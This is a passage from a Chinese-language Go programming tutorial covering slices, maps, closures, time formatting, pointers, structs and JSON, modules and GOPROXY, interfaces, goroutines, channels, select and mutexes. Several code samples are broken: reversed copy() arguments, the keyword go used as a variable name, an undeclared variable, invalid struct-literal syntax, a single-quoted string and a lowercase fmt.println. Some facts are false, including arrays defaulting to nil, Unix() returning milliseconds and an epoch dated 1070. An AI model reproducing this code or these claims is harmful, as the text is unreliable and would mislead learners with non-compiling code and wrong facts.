len(hallo); i++ {\rfmt.Print(hallo[i], \u0026quot;\\n\u0026quot;)\r}\r也可以用for range方法\n数组是值类型，将数组赋值给另一个变量，会生成副本，修改另一个变量，只会修改副本，不会修改原来的数组，例如：\nhallo := [...]int{1: 66, 3: 100}\rabc := hallo\rabc[1] = 100\rfmt.Println(hallo, abc)\r可以看到在golang中数组不是引用类型\n二维数组\nvar abc = [...][2]int{{100,123},{222,333},{666,60}}\rfmt.Println(abc)\rfor i := 0; i \u0026lt; len(abc); i++ {\rfor j := 0; j \u0026lt; len(abc[0]); j++ {\rfmt.Println(abc[i][j])\r}\r}\r数组的初始值为nil（nil表示为空）\n知识点：指针和引用类型的默认值为nil，需要分配空间\n切片\n切片和数组类似（切片是基于数组类型进行一层封装），不过切片是引用类型（调用的只是在内存中的地址，指针）的\nvar hallo = []int{100, 2333, 666}\rabc := hallo\rabc[0] = 123\rxyz = abc[1:2]\rfmt.Println(hallo, abc, xyz)\rfor i := 0; i \u0026lt; len(abc); i++ {\rfmt.Print(abc[i], \u0026quot;\\n\u0026quot;)\r}\r长度用len()获取，容量用cap()获取\nmake函数创建切片\nvar data = make([]int, 2, 8) // int类型，长度为2，容量为8\rfmt.Printf(\u0026quot;长度：%d, 容量%d\u0026quot;, len(data), cap(data))\rappend()切片扩容\nvar hallo = []int64{100, 2333, 666}\rhallo = append(hallo, 123)\rfmt.Println(hallo) // 100, 2333, 666, 123\rabc := []int64{1,3,4,5,6}\rhallo = append(hallo, abc...) // 将两个切片合并\rfmt.Println(hallo) // 100,2333,666,123,1,3,4,5,6\rcopy()函数复制切片（可以理解为深拷贝）\nvar hallo = []int64{100, 2333, 666}\rvar abc = make([]int64, len(hallo), len(hallo))\rcopy(hallo, abc)\rabc[0] = 4\rfmt.Println(hallo,abc)\r删除切片的值（golang中并没有删除切片的值的方法，不过可以用append()实现）\nvar hallo = []int64{100, 2333, 666}\rhallo = append(hallo[:2], hallo[3:]...)\rfmt.Println(hallo)\r遍历切片和数组一样\nmap（字典）\nmap（字典）是无序的基于key-value的数据结构，在golang中map是引用类型\nvar abc = make(map[string]int) // string是键的类型，int是键对应的值的类型\rabc[\u0026quot;user\u0026quot;] = 123\rabc[\u0026quot;pass\u0026quot;] = 666\rfmt.Println(abc)\rfmt.Println(abc[\u0026quot;pass\u0026quot;])\r或者\nvar hallo = map[string]string {\r\u0026quot;user\u0026quot;:\u0026quot;root\u0026quot;,\r\u0026quot;pass\u0026quot;:\u0026quot;abchahaha\u0026quot;,\r}\rfmt.Println(hallo)\r遍历map\nvar hallo = map[string]string {\r\u0026quot;user\u0026quot;:\u0026quot;root\u0026quot;,\r\u0026quot;pass\u0026quot;:\u0026quot;abchahaha\u0026quot;,\r}\rfor key, value := range hallo {\rfmt.Println(\u0026quot;key:\u0026quot;, key, \u0026quot; value:\u0026quot;, value)\r}\r判断map中某个键值是否存在\nvar hallo = map[string]string {\r\u0026quot;user\u0026quot;:\u0026quot;root\u0026quot;,\r\u0026quot;pass\u0026quot;:\u0026quot;abchahaha\u0026quot;,\r}\rvalue, yes := hallo[\u0026quot;pass\u0026quot;] // 返回2个值。value为返回结果，yes为是否存在该键值\rfmt.Println(value, yes)\rdelete()删除键值对\nvar hallo = map[string]string {\r\u0026quot;user\u0026quot;:\u0026quot;root\u0026quot;,\r\u0026quot;pass\u0026quot;:\u0026quot;abchahaha\u0026quot;,\r}\rdelete(hallo, \u0026quot;pass\u0026quot;)\rvalue, no := hallo[\u0026quot;pass\u0026quot;]\rfmt.Println(value, no)\r通道\nGolang中还有一个特殊的类型chan，这个类型一般用来线程之间的数据传输\n声明chan\nvar a chan int a := make(chan int, 1) a \u0026lt;- 999 b := \u0026lt;- a\nchan底层是指针，指针初始值为空，需要实例化，make()就是实例化了chan\n\u0026lt;- 999：将值放进通道\n\u0026lt;- a : 将 999 从通道中提取出来\n函数\n函数通过func关键字来声明和定义函数\nfunc hallo(a ...string){\rfmt.Println(a)\r}\rfunc main(){\rhallo(\u0026quot;hallo golang!!!\u0026quot;)\r}\r匿名函数\nfunc main() {\rfunc () {\rfmt.Println(\u0026quot;我是匿名函数\u0026quot;)\r}()\r}\r因为没有函数名，没法像正常函数那样被调用，需要将其赋值或者作为立即执行函数\n返回值\nfunc hallo(a, b int) (int,int,int) {\rx := a+b\ry := a-b\rz := a*b\rreturn x, y, z\r}\rfunc main(){\rabc, xyz, go := hallo(6,3)\rfmt.Println(abc, xyz, go)\r}\r当然也是可以自动返回\nfunc hallo(a, b int) (x int,y int,z int){}\ngolang的全局变量和局部变量\n全局变量：常驻内存中，污染全局\n局部变量：不常驻内存中，不污染全局\n闭包：让变量可以常驻内存的同时，不污染全局\n闭包的写法：\nfunc hallo() func() int {\ri := 123\rreturn func() int {\rreturn i + 666\r}\r}\rfunc main() {\rvar abc = hallo()\rfmt.Println(abc())\r}\r或者\nfunc hallo() func(a int) int {\rvar i = 10\rreturn func(a int) int {\ri = i + a\rreturn i\r}\r}\rfunc main() {\rvar abc = hallo()\rfmt.Println(abc(666))\r}\rdefer修饰语句可以延迟执行语句，例如：\nfmt.Println(\u0026quot;1\u0026quot;)\rdefer fmt.Println(\u0026quot;2\u0026quot;)\rfmt.Println(\u0026quot;3\u0026quot;)\r如果使用多个defer修饰语句，会逆序执行（先使用defer最后执行，最后使用defer，最早执行（相对于使用defer修饰的语句））\n在golang中的time包提供了时间显示和测量时间的函数\n获取时间（年-月-日）例如：\ntimedata := time.Now()\ryear := timedata.Year()\rmonth := timedata.Month()\rday := timedata.Day()\rfmt.Printf(\u0026quot;%d-%02d-%02d \\n\u0026quot;, year, month, day)\r格式化日期（在golang中，并且不是使用Y-m-d H:M:S模板格式化，而且是使用Go的诞生时间：2006年1月2日 15点04分）\n例如：\ntimedata := time.Now()\rfmt.Println(timedata.Format(\u0026quot;2006-01-02 15:04:05\u0026quot;)) // 24小时制\rfmt.Println(timedata.Format(\u0026quot;2006-01-02 03:04:05\u0026quot;)) // 12小时制\r获取时间戳（时间戳是自1070年1月1日08:00:00GMT至今的总毫秒数，又叫Unix时间戳）\n例如：\ntimedata := time.Now()\runixTime := timedata.Unix() // 毫秒时间戳\runixNaTime := timedata.UnixNano() // 纳秒时间戳\rfmt.Println(unixTime,unixNaTime)\r时间戳转正常日期\nvar abc = time.Unix(1642746020, 0)\rvar xyz = abc.Format(\u0026quot;2006-01-02 15:04:05\u0026quot;)\rfmt.Println(xyz)\r正常日期转时间戳\nvar abc = \u0026quot;2022-01-21 14:21:55\u0026quot;\rvar tmp = \u0026quot;2006-01-02 15:04:05\u0026quot;\rtimedata, err := time.ParseInLocation(tmp, abc, time.Local)\rfmt.Println(timedata.Unix())\r时间的间隔（两个时间之间的间隔，单位为纳秒，time.Duration是time定义的类型，表示一段时间间隔，最大可以表示290年）\ndata := time.Now()\rabc := data.Add(time.Hour)\rxyz := data.Add(time.Second)\rfmt.Println(abc) // 输出1个小时后的时间\rfmt.Println(xyz) // 输出1秒后的时间\r指针\ngolang的指针有3个概念，地址，类型，取值\n\u0026amp;：获取地址，*：根据地址取值\na := 100\rb := \u0026amp;a\rfmt.Println(b) // 获取地址\rfmt.Println(*b) // 根据地址取值\r*b = 666 fmt.Println(a) // 根据地址修改值，改变内存中的值，会改变原来的变量值\r注意：指针必须在创建内存后才能使用（其他引用类型也是一样，需要用make分配空间或者在定义的时候分配空间，值类型在声明的时候已经分配了默认空间，因此值类型不用分配空间）\nnew关键字分配内存（new是一个内置函数，调用new函数得到的是指定类型的指针，并且指针对应的值为该类型的零值）\nabc := new(int)\rfmt.Printf(abc)\rfmt.Println(*abc)\rmake和new的区别：虽然这两个都是用来内存分配的，不过make是用于map，channel，切片（slice）的初始化，返回的值为这3个类型的本身，而new是用来类型的内存分配，内存对应的值为类型的零值，返回的值为指向类型的指针\nGolang语言是面向对象语言又不是，虽然有类型和方法，也支持面向对象的编程风格，但是go没有对象（object）这个类型，也没有类（class）的概念，在go中用结构体替代面向对象语言的类（class）\ntype关键字（go通过type关键字定义结构体，结构体是值类型）\n自定义类型（type也可以来定义自定义类型）\ntype dataStr string\rdataStr自定义类型具备string类型的特性\ntype dataStr string\rfunc main() {\rvar abc dataStr = \u0026quot;hallo word\u0026quot;\rfmt.Printf(\u0026quot;%v %T\u0026quot;, abc, abc)\r}\r类型别名（只是别名，实质上还是同一个类型）\ntype dataStr = string\r结构体的定义以及初始化（type关键字和struct关键字）\ntype Data struct{\ruser string // 定义结构体\rage int\rpass string\r}\rfunc main(){\rvar data Data // 实例化\rdata.user = \u0026quot;root\u0026quot;\rdata.age = 20\rdata.pass = \u0026quot;123456789\u0026quot;\rfmt.Printf(\u0026quot;%#v\u0026quot;, data)\r}\r也可以使用new关键字实例化\nfunc main(){\rvar data = new(Data) // 实例化\rdata.user = \u0026quot;root\u0026quot;\r// 等于 (*data).user = \u0026quot;root\u0026quot;\rdata.age = 20\rdata.pass = \u0026quot;123456789\u0026quot;\rfmt.Printf(\u0026quot;%#v\u0026quot;, data) // 结构体指针\r}\r在golang中支持直接对结构体指针使用，来访问结构体的属性\n另外几种实例化结构体的方法\nvar data = \u0026amp;Data{\rdata.user = \u0026quot;root\u0026quot;,\rdata.age = 20,\rdata.pass = \u0026quot;123456789\u0026quot;,\r}\rfmt.Printf(\u0026quot;%#v\u0026quot;, data)\rvar data = Data{\rdata.user = \u0026quot;root\u0026quot;,\rdata.age = 20,\rdata.pass = \u0026quot;123456789\u0026quot;,\r}\rfmt.Printf(\u0026quot;%#v\u0026quot;, data)\rvar data = Data{\r\u0026quot;root\u0026quot;,\r20,\r\u0026quot;123456789\u0026quot;,\r}\rfmt.Printf(\u0026quot;%#v\u0026quot;, data)\r结构体的方法和接收\ntype Data struct{\r// 定义结构体\ruser string age int\rpass string\r}\rfunc (d Data) DataMain() {\r// 定义方法\rfmt.Print(\u0026quot;user:\u0026quot;, d.user)\rfmt.Print(\u0026quot;age:\u0026quot;, d.age)\rfmt.Print(\u0026quot;pass:\u0026quot;, d.pass)\rfmt.Println()\r}\rfunc (d *Data) GetData(user string, age int, pass string) {\r// 接收方法，因为结构体是值类型，需要使用指针\rd.user = user\rd.age = age\rd.pass = pass\r}\rfunc main() {\rvar data = Data{\r\u0026quot;root\u0026quot;,\r20,\r\u0026quot;123456789\u0026quot;,\r}\rdata.DataMain()\rdata.GetData(\u0026quot;admin\u0026quot;, 22, \u0026quot;abc12345\u0026quot;)\rdata.DataMain()\r}\r输出结果为：\nuser:rootage:20pass:123456789 user:adminage:22pass:abc12345\n自定义类型方法（类型一样可以定义方法）\ntype dataStr string\rfunc (d dataStr) dataInfo(){\rfmt.Println(\u0026quot;hallo golang\u0026quot;) // 自定义类型的自定义方法\r}\rfunc main() {\rvar abc dataStr = \u0026quot;hallo word\u0026quot;\rabc.dataInfo()\r}\r结构体匿名字段（go允许字段在声明的时候没有字段名，只有类型，因为结构体要求字段名唯一，因此在同一个结构体中同种类型的匿名字段只能出现一次）\ntype Data struct{\r// 定义结构体\rstring int\rstring\r}\rfunc main(){\rvar data = Data{\r// 结构体匿名字段\r\u0026quot;root\u0026quot;,\r20,\r\u0026quot;123456789\u0026quot;,\r} }\r注意：结构体的字段类型可以是任意类型（包括自定义类型，结构体类型），但是如果类型是引用类型（例如map，指针）需要先使用make分配空间再使用\n结构体嵌套\ntype Data struct{\r// 定义结构体\ruser string age int\rpass string\rdatamain DataMain //嵌套DataMain结构体\r}\rtype DataMain struct{\r// 定义结构体\remail string\rphone string\r}\rfunc main() {\rvar d Data\rd.user = \u0026quot;xiaochen\u0026quot;\rd.age = 20\rd.pass = \u0026quot;123456789\u0026quot;\rvar datamain DataMain\rdatamain.email = \u0026quot;a@xiaochenabc123.test.com\u0026quot;\rdatamain.phone = \u0026quot;18888888888\u0026quot;\rd.datamain = datamain\rfmt.Printf(\u0026quot;%#v\u0026quot;, d)\r}\r输出结果为main.Data{user:\u0026ldquo;xiaochen\u0026rdquo;, age:20, pass:\u0026ldquo;123456789\u0026rdquo;, datamain:main.DataMain{email:\u0026ldquo;a@xiaochenabc123.test.com\u0026rdquo;, phone:\u0026ldquo;18888888888\u0026rdquo;}}\n嵌套结构体可能出现字段名相同，go默认先从父结构体查找，如果没有再到子结构体中查找，这时如果子结构体存在相同的字段，会报错，因为不知道该设置哪个字段（所以字段名要全局唯一）\n结构体继承（可以理解为类的继承，实质效果和结构体嵌套类似）\ntype Data struct{\r// 定义结构体\ruser string age int\rpass string\rDataMain //通过结构体嵌套实现继承\r}\rfunc (data Data) datamax() {\rfmt.Printf(\u0026quot;email: %v \\n\u0026quot;, data.email)\r}\rtype DataMain struct{\r// 定义结构体\remail string\rphone string\r}\rfunc (datamain DataMain) dataabc() {\rfmt.Printf(\u0026quot;email: %v \\n\u0026quot;, datamain.email)\r}\rfunc main() {\rvar data = Data{\ruser: \u0026quot;root\u0026quot;,\rDataMain: DataMain{\remail: \u0026quot;a@xiaochenabc123.test.com\u0026quot;,\r},\r}\rdata.datamax();\rdata.dataabc();\r}\r可以看到Data结构体拥有DataMain结构体的方法\n注意结构体的字段首字母要大写，表示公有，小写为私用\ngo结构体和json序列化\n将结构体转换为json叫json序列化，将json转换为结构体叫json反序列化\njson序列化和json反序列化主要依赖于encoding/json包的json.Marshal()方法和json.Unmarshal()方法\ntype Data struct{\r// 定义结构体\rUser string Age int\rPass string\r}\rfunc main() {\rvar data = Data{\rUser: \u0026quot;root\u0026quot;,\rAge: 20,\rPass: \u0026quot;123456789\u0026quot;,\r}\r// 结构体转换成Json（返回值为是byte类型的切片）\rjsonByte, _ := json.Marshal(data)\r// byte类型转string类型\rjsonStr := string(jsonByte)\rfmt.Printf(string(jsonByte))\rfmt.Printf(jsonStr)\r}\rjson字符串转结构体\ntype Data struct{\r// 定义结构体\rUser string Age string\rPass string\r}\rfunc main() {\r// Json字符串转换成结构体\rvar str = `{\u0026quot;User\u0026quot;:\u0026quot;root\u0026quot;,\u0026quot;Age\u0026quot;:\u0026quot;20\u0026quot;,\u0026quot;Pass\u0026quot;:\u0026quot;123456789\u0026quot;}`\rvar data = Data{}\r// 第一个参数是传入byte类型的json字符串，第二个参数需要传入转换的地址\rerr := json.Unmarshal([]byte(str), \u0026amp;data)\rif err != nil {\rfmt.Printf(\u0026quot;转换失败 \\n\u0026quot;)\r} else {\rfmt.Printf(\u0026quot;%#v \\n\u0026quot;, data)\r}\r}\r结构体标签（tag）\ntag是结构体的元信息，可以在运行时通过反射的机制读取出来，tag在结构体字段后面定义，用反引号包裹，tag是以键值对的方式组成，不同的tag用空格分隔\ntype Data struct{\r// 定义结构体，并且使用结构体标签\rUser string `json:\u0026quot;user\u0026quot;`\rAge string `json:\u0026quot;age\u0026quot;`\rPass string `json:\u0026quot;pass\u0026quot;`\r}\rfunc main() {\rvar data = Data{\rUser: \u0026quot;root\u0026quot;,\rAge: \u0026quot;20\u0026quot;,\rPass: \u0026quot;123456789\u0026quot;,\r}\rjsonByte, _ := json.Marshal(data)\r// byte类型转string类型\rjsonStr := string(jsonByte)\rfmt.Printf(jsonStr)\rvar str = `{\u0026quot;User\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;Age\u0026quot;:\u0026quot;22\u0026quot;,\u0026quot;Pass\u0026quot;:\u0026quot;abc12345\u0026quot;}`\rvar datajson = Data{}\rerr := json.Unmarshal([]byte(str), \u0026amp;datajson)\rif err != nil {\rfmt.Printf(\u0026quot;转换失败 \\n\u0026quot;)\r} else {\rfmt.Printf(\u0026quot;%#v \\n\u0026quot;, datajson)\r}\r}\r包(package)是多个源码的集合，是一种代码复用方案，像fmt，time，encoding/json都是go的内置包\ngo中的包分为3种，内置包（go提供的内置包，可以直接引入使用），自定义包（自己写的包），第三方包（也是自定义包，不过不是自己写的，需要下载到本地才能使用）\n包管理器（go mod）（在1.11版本之前需要使用自定义包的话，需要将项目放在GOPATH环境变量中，1.13之后将彻底不需要GOPATH）\n初始化项目（生成go.mod来管理项目的依赖（包括go版本和要使用到的包））\ngo mod init go_test\n如果要引入go_test项目的包，需要import \u0026ldquo;go_test/包名\u0026rdquo;，包名根据package设置\npackage 包名\n注意：包名不能和文件夹的名字相同，包名不能出现-符号，一个文件夹中直接包含的文件只能归1个package，同一个package的文件不能在多个文件夹中，而且只有引入了包名为main的程序，编译后会得到可执行文件，如果没有包含main包的程序编译不会得到可执行文件\ninit()初始化函数：导入包，自动触发包内部的init()函数的调用\ngo会先从main包开始检查其导入的所有包，每个包又可能导入了其他包，因此形成了一个树状包引入关系，根据引入的顺序来决定编译的顺序\n最后导入的包最先初始化并且调用其init()函数\ngolang第三包仓库https://pkg.go.dev/\ngo install 编译并安装包（当存在GOBIN环境变量时，编译完成的二进制文件放到$GOBIN下，如果不存在默认放到GOPATH/bin下，源码默认在$HOME/sdk下）\ngo install github.com/tal-tech/go-zero@1.4.1\ngo get 全局安装包（Go 1.17版本中已被弃用，推荐使用go install ）\ngo get github.com/tal-tech/go-zero\ngo mod download 全局安装包\n依赖自动下载到$GOPATH/pkg/mod目录，多个项目可共享缓存的mod，使用该命令之前需要在项目引入第三方包\ngo mod vendor 将依赖复制到当前项目的vendor中，需要在项目引入第三方包\ngo mod vendor\n其他命令\ngo mod edit 编辑go.mod文件\ngo mod tidy 自动处理go.mod中多引入和少引入的包（没有使用的module移除，缺少引入的module将自动引入构建，确保go.mod与模块中的源代码一致）\ngo mod graph 打印模块依赖图\ngo mod verify 校验依赖，检查下载的第三方库是否本地修改，如果没有修改则返回0（校验成功），否则返回非0（校验失败）\ngo mod why 解释为啥需要包\n使用Modules\nGO111MODULE：1.12版本之前的，要设置环境变量GO111MODULE，之后就不需要了通过设置GO111MODULE来开启或者关闭go module\nGO111MODULE = off 禁用go module，编译时在GOPATH和vendor中查找包 GO111MODULE = on 启用go module，编译时忽略GOPATH和vendor，只根据go.mod下载依赖 GO111MODULE=auto 默认值，当项目在GOPATH/src之外，并且项目的根目录有go.mod文件时启用go module\nwindows设置GO111MODULE\nset GO111MODULE=on|off|auto\nMacOS或者Linux设置GO111MODULE\nexport GO111MODULE=on|off|auto\noff和auto，下载的包安装在GOPATH/src目录下\nno，下载的包安装在GOPATH/pkg/mod/下，也在这个目录下查找包（不在GOPATH/src查找）\n也可以手动修改环境变量，GO111MODULE变量，值为on|off|auto\nGOPROXY：GO代理服务器，是Go官方提供的中间代理的方式来包下载，需要设置GOPROXY环境变量\n常见的代理服务器地址：\ngoproxy.io； goproxy.cn：由国内的七牛云提供\n一键设置GOPROXY：\nwindows：go env -w GOPROXY=https://goproxy.cn,direct\nLinux或者macOS：export GOPROXY=https://goproxy.cn\n注意：go语言在1.13版本后，GOPROXY默认为https://proxy.golang.org，如果下载缓慢或者无法访问请设置为https://goproxy.cn\n也可以手动修改环境变量，GOPROXY变量，值为https://goproxy.cn\n依赖的安装（注意：需要移除把项目从GOPATH移除（GOPATH下不允许有go.mod），否则报错$GOPATH/go.mod exists but should not）\ngo get下载指定版本的依赖包\ngo get -u 升级项目中的包到最新的次要版本或者修订版本 go get -u=patch 升级项目中的包到最新的修订版本 go get 包名@版本号 下载对应包的指定版本或者将对应包升级到指定的版本，版本号可以是v1.x.x之类的，也是可以是git的分支，tag，git提交的哈希值\n手动修改go.mod，执行go mod download或者使用go get\ngo的接口（interface）是一种抽象数据类型，接口定义了对象的行为规范，只负责定义规范，并不实现，接口的规范实现由具体的对象来实现\n接口是一组函数method的集合，接口不能存在任何变量，接口中的全部方法都没有方法体\ntype TestData interface{\r// 定义一个TestData接口\rtest()\rdata()\r}\rtype Data struct {\r// 实现接口\rUser string\r}\rfunc (d Data) test() {\rfmt.Println(d.User, \u0026quot;Test\u0026quot;)\r}\rfunc (d Data) data() {\rfmt.Println(d.User, \u0026quot;Data\u0026quot;)\r}\rfunc main() {\rvar datamain TestData = Data{\r\u0026quot;root\u0026quot;,\r}\rdatamain.test()\rdatamain.data()\r}\r空接口（接口允许不定义任何方法，不定义任何方法的接口就是空接口）\ntype Maxdata interface {\r// 定义一个空接口，空接口表示没有约束，任何类型都能实现空接口\r}\rfunc main() {\rvar abc Maxdata\rvar str = \u0026quot;hallo word\u0026quot;\rabc = str\rfmt.Println(abc)\r}\rGo1.18版本已添加any关键字来表示泛型\nfunc main(){\rvar abc any\rabc = 'hallo any'\rfmt.Println(abc)\r}\r实质上any还是空接口interface{}的类型别名，type any = interface{}\n空接口也可用来当做类型，表示任意类型（类似于Java中的Object类型）\n空接口还可以用来当做函数的参数，表示可以接收任意类型的函数参数\nfunc Data(abc interface{}) {\rfmt.println(abc)\r}\r使用空接口来实现可以保存任意类型的map\nvar dataInfo = make(map[string]interface{})\rdataInfo[\u0026quot;uesr\u0026quot;] = \u0026quot;root\u0026quot;\rdataInfo[\u0026quot;age\u0026quot;] = 20\rdataInfo[\u0026quot;pass\u0026quot;] = \u0026quot;123456789\u0026quot;\r使用空接口来实现一个空接口类型的切片\nvar dataslice = make([]interface{}, 6, 6)\rdataslice[0] = \u0026quot;root\u0026quot;\rdataslice[1] = 20\rdataslice[3] = \u0026quot;123456789\u0026quot;\r类型断言\n接口的值是由具体类型和具体类型的值组成，称为接口的动态类型和动态值\n判断空接口的值的类型，需要使用类型断言，语法格式为：类型为interface{}的变量.(断言这个变量可能是的类型)\n例如：\nvar abc interface{}\rabc = 123\rvalue, isInt := abc.(int)\rif isInt {\rfmt.Println(\u0026quot;int类型, 值为：\u0026quot;, value)\r} else {\rfmt.Println(\u0026quot;不是int类型，断言失败\u0026quot;)\r}\rGo并发\n还是讲一下进程和线程的区别\n进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源的分配和调度的基本单位，每个进程都拥有一个自己的地址空间，进程至少有5种基本状态，分别是：初始状态，执行状态，等待状态，就绪状态，终止状态\n线程（Thread）是进程的执行实例，是程序执行的最小单位，是操作系统能够进行运算调度的最小单位，一个进程可以创建多个线程，同一个进程的线程共享进程的内存信息，同一个进程的多个可以并发执行，一个线程要执行，必须至少有一个进程\n并发和并行的区别\n并发：指一个时间段中有多个线程（程序）被快速的轮换执行（处于启动运行到运行完毕之间），在一个时间段中只有一个线程（程序）在执行，在宏观上感觉是多个线程同时被处理，如果多线程操作在一个cpu上，操作系统将cpu运行时间分隔为若干个时间段，将时间段分配给各个线程执行，在一个时间段的线程执行时，其他线程将处于挂起状态，这就叫并发\n并行：当系统拥有多个cpu（1个以上）时，一个cpu执行一个线程，另一个线程执行另一个线程，同时进行处理，这就叫并行\n并发和并行的区别：并发一个时间段只能执行一个线程（多个线程需要排队执行），并行可以在一个时间段中同时执行多个线程\n当多线程程序在单核CPU上执行时，就是并发，在多核CPU执行时，就是并行，当线程数大于CPU核数，那么既有并行又有并发\ngo的主线程和协程（goroutine）：主线程可调起多个协程，而多协程就是可以实现并行或者并发了\n每个goroutine (协程) 默认占用内存远比 Java 、C的线程少（goroutine是2kb，加上协程调度内存开销也比线程少，因此goroutine是轻量级线程）\n通过go关键字开启goroutine即可实现协程功能，goroutine的调度由golang运行时进行管理，例如\nvar wg sync.WaitGroup // 协程计数器\rfunc data1() {\rfor i := 0; i \u0026lt; 5; i++ {\rfmt.Println(\u0026quot;hallo word\u0026quot;)\rtime.Sleep(time.Millisecond * 100)\r}\rwg.Done() // 程序结束则协程计数器减1\r}\rfunc data2() {\rfor a := 0; a \u0026lt; 5; a++ {\rfmt.Println(\u0026quot;hallo golang\u0026quot;)\rtime.Sleep(time.Millisecond * 100)\r}\rwg.Done() // 程序结束则协程计数器减1\r}\rfunc main() {\rwg.Add(1) // 协程计数器加1\rgo data1()\rwg.Add(1) // 协程计数器加1\rgo data2()\rfor i := 0; i \u0026lt; 5; i++ {\rfmt.Println(\u0026quot;hallo hahaha\u0026quot;)\rtime.Sleep(time.Millisecond * 100)\r}\rwg.Wait() // 等待所有的协程执行完毕\rfmt.Println(\u0026quot;主线程结束\u0026quot;)\r}\r通过time.Sleep设置100毫秒定时，可以看到并没有顺序输出，因为这里使用了多协程\ngo运行时的调度器通过GOMAXPROCS参数来确定使用多少个OS线程来执行，默认值为计算机的cpu核心数，例如32核的计数器，调度器将程序同时调度到32个OS线程上，通过runtime.GOMAXPROCS()设置当前程序发时的CPU逻辑核心数，runtime.NumCPU()获取计算机的CPU核心数\n注意：go1.5版本之前，默认使用单核心，1.5版本之后默认使用全部核心数\nCpu := runtime.NumCPU() // 获取cpu个数\rfmt.Println(\u0026quot;cpu核心数:\u0026quot;, Cpu)\rruntime.GOMAXPROCS(runtime.NumCPU() - 1) // 设置要使用的CPU数量\r看看多协程实质执行效果\nvar vg sync.WaitGroup\rfunc data(num int) {\rfor i := 0; i \u0026lt;= 10; i++ {\rfmt.Printf(\u0026quot;协程%v输出的%v条数据 \\n\u0026quot;, num, i)\r}\rvg.Done()\r}\rfunc main() {\rfor i := 0; i \u0026lt;= 10; i++ {\rgo data(i)\rvg.Add(1)\r}\rvg.Wait()\rfmt.Println(\u0026quot;主线程结束\u0026quot;)\r}\r通道（channel）是传输数据的一种数据结构（类型），被用来多个goroutine之间传递信息通讯，可以让goroutine发送特定值给另一个goroutine\ngo语言的并发模型是CSP（Communicating Sequential Processes），goroutine是并发体，channel是通信\nchannel遵循先入先出（First In First Out）的规则，保证数据的顺序，channel类型是引用类型\n声明管道（通过chan关键字声明）\nvar ch1 chan int // 声明传递整型的管道\rvar ch2 chan string // 声明传递字符串的管道\r因为其是引用类型，需要使用make()声明内存空间才能使用\nch1 = make(chan int, 10) // 创建一个可以存储10个int类型的管道\rch2 = make(chan string, 10) // 创建一个可以存储10个string类型的管道\r管道具备发送数据，接收数据和关闭管道功能，其中发送和接收都使用\u0026lt;-符号表示，例如：\nch2 \u0026lt;- \u0026quot;hall word\u0026quot; // 将hall word发送到ch2管道里\rdata := \u0026lt;- ch2 // 接收ch2管道的数据\rclose(ch2) // 通过内置的close函数关闭管道\r管道也有容量，长度，用cap(), len()获取\n管道阻塞：当管道没有数据，还进行接收，就会出现阻塞，同样当管道容量不足了，还进行发送数据，也会导致阻塞\n注意：当管道被关闭，还继续给管道添加数据或者接收数据将导致panic: send on closed channel报错，如果goroutine执行完毕，管道不关闭，将抛出fatal error: all goroutines are asleep - deadlock!错误\n另外使用for range循环在管道取值，在使用for range之前一定要关闭管道，使用for循环遍历管道就不需要关闭管道了\ngoroutine和channel协作\nfunc data(ch1 chan int) {\rfor i := 0; i \u0026lt;= 5; i++ {\rfmt.Println(\u0026quot;写入:\u0026quot;, i)\rch1 \u0026lt;- i\rtime.Sleep(time.Millisecond * 100)\r}\rwg.Done()\r}\rfunc dataGet(ch1 chan int) {\rfor a := 0; a \u0026lt;= 5; a++ {\rfmt.Println(\u0026quot;接收:\u0026quot;, \u0026lt;-ch1)\rtime.Sleep(time.Millisecond * 100)\r}\rwg.Done()\r}\rfunc main() {\rch1 := make(chan int, 5)\rwg.Add(1)\rgo data(ch1)\rwg.Add(1)\rgo dataGet(ch1)\rwg.Wait()\rfmt.Println(\u0026quot;主线程结束\u0026quot;)\r}\rdata函数写入数据到ch1，dataGet函数接收数据，并且可以看到管道写入数据后，会等待接收数据\n单向管道（限制管道在函数中只能接收数据或者只能发送数据，管道默认可接收可发送）\n声明只可发送的管道（不能接收）\nvar ch = make(chan\u0026lt;- int, 5)\rch \u0026lt;- 10\r声明只可读的管道（不能发送）\nvar ch1 = make(\u0026lt;-chan int, 5)\r\u0026lt;- ch1\r使用select关键字实现多路复用，来从多个管道接收数据，因为管道的特性，没有数据可以接收会导致阻塞\nselect关键字类似于switch语句，有case分支和default分支，一个case负责一个管道的发送和接收，select会等待某个case通信操作完成，再执行case分支的语句\n例如：\nvar ch1 = make(chan int, 10)\rch1 \u0026lt;- 1\rch1 \u0026lt;- 2\rch1 \u0026lt;- 10\rch1 \u0026lt;- 8\rch1 \u0026lt;- 0\rch1 \u0026lt;- 23\rvar ch2 = make(chan string, 10)\rch2 \u0026lt;- \u0026quot;hallo word\u0026quot;\rch2 \u0026lt;- \u0026quot;hallo golang\u0026quot;\rfor {\rselect {\rcase data:= \u0026lt;- ch1:\rfmt.Println(\u0026quot;读取ch1的数据：\u0026quot;, data)\rcase data:= \u0026lt;- ch2:\rfmt.Println(\u0026quot;读取ch2的数据：\u0026quot;, data)\rdefault:\rfmt.Println(\u0026quot;所有的数据获取完毕\u0026quot;)\rreturn\r}\r}\r可以看到管道发送数据和接收数据是按照顺序的，另外使用select获取数据时，不要关闭管道（当使用完再关闭）\n并发安全和锁\n在并发环境中，可能会出现并发访问的问题，需要使用互斥锁\n互斥锁是并发时对共享资源进行控制访问的手段，使用sync标准库的Mutex结构体定义，sync.Mutex有两个指针方法，分别是Lock()和Unlock()\nvar mutex sync.Mutex // 定义锁\rmutex.Lock() // 上锁\rmutex.Unlock() // 解锁\r当禁止访问公共资源时上锁，当需要访问公共资源时解锁\n互斥锁实质上就是当一个goroutine访问时，其他goroutine不能访问，避免竞争，如果只读不写的话，也不会出现资源竞争的情况，因为写数据，需要保证数据同步，当写数据，又不能保证数据同步就是会出现资源竞争了\n读取数据和读取数据之间不会资源竞争的特性衍生出另外一种锁，叫做读写锁\n读写锁可以将多个读取并发，同时读取，并且对修改数据是完全互斥的，当一个goroutine修改数据（写）时，其他goroutine不能读取数据也是不能写数据\n在go语言中，读写锁用sync.RWMutex定义\nvar mu sync.RWMutex // 定义读写锁\rmu.RLock() // 上锁\rmu.RUnlock() // 解锁\r操作文件和目录\n使用os.Open读取文件\nfile, err := os.Open(\u0026quot;./data.txt\u0026quot;) // 读取文件\rdefer file.Close() // 关闭文件流\rif err != nil {\rfmt.Println(\u0026quot;打开文件出错\u0026quot;)\r}\rvar bytedata = make([]byte, 1024)\rfor {\rn, err := file.Read(bytedata) // n为字节数, 